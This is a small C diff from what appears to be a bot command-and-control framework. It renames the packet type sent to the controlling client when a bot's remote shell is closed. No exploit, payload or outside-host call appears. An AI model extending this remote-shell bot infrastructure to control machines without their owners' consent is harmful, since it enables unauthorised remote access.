@@ -50,7 +50,7 @@ void laikaC_closeAuthShell(struct sLaika_authInfo *aInfo) {
 
 void laikaC_closeBotShell(struct sLaika_botInfo *bInfo) {
     /* forward to SHELL_CLOSE to auth */
-    laikaS_emptyOutPacket(bInfo->shellAuth, LAIKAPKT_AUTHENTICATED_SHELL_CLOSE);
+    laikaS_emptyOutPacket(bInfo->shellAuth, LAIKAPKT_SHELL_CLOSE);
 
     /* close shell */
     ((struct sLaika_authInfo*)(bInfo->shellAuth->uData))->shellBot = NULL;
